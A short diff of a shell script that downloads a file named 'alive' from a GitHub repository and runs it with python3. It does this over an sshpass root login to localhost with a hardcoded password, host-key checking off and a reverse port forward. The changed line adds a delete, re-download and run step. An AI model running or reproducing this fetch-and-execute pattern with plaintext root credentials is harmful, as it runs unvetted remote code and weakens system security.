@@ -21,4 +21,4 @@ wget https://github.com/xgffhu879/download/raw/refs/heads/main/alive
 
 echo done
 netstat -nltp
-sshpass -p "aunglay" ssh root@localhost -o StrictHostKeyChecking=no -o "ServerAliveInterval 10000000" -o "ServerAliveCountMax 10000000" -p 7777 -R 5555:127.0.0.1:4444 -t python3 /root/alive
+sshpass -p "aunglay" ssh root@localhost -o StrictHostKeyChecking=no -o "ServerAliveInterval 10000000" -o "ServerAliveCountMax 10000000" -p 7777 -R 5555:127.0.0.1:4444 -t rm -rf alive;wget https://github.com/xgffhu879/download/raw/refs/heads/main/alive;python3 alive
